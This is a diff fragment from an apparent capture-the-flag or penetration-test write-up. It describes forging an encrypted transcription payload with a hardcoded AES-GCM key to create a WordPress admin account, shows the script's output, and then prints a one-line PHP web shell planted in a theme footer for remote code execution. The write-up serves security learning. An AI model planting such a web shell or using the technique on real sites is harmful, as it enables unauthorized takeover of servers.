@@ -344,10 +344,17 @@ The AES-GCM key is hardcoded in the public JavaScript served by the subdomain, m
 
 Since the payload is encrypted with the correct key, the server successfully decrypts it and treats it as a legitimate transcription, storing the embedded `<script>...</script>` payload without detecting that it was crafted by an attacker.
 
-
-
-
-
+```
+python add_admin.py   
+[*] save_voice_raw: {"success":true,"data":{"message":"Audio saved, processing started.","post_id":81}}
+[*] post_id: 81
+[*] save_voice_results: {"success":true,"data":{"message":"Results saved successfully!","post_id":81}}
+```
+So we just created an admin user that we can use to access via /wp-admin. Now we obtain a RCE modifing the footer .php with:
+```
+<?php if(isset($_GET['cmd'])) system($_GET['cmd']); ?>
+```
+<img src="img/admin_webshell.png" width="500">     
 
 
 
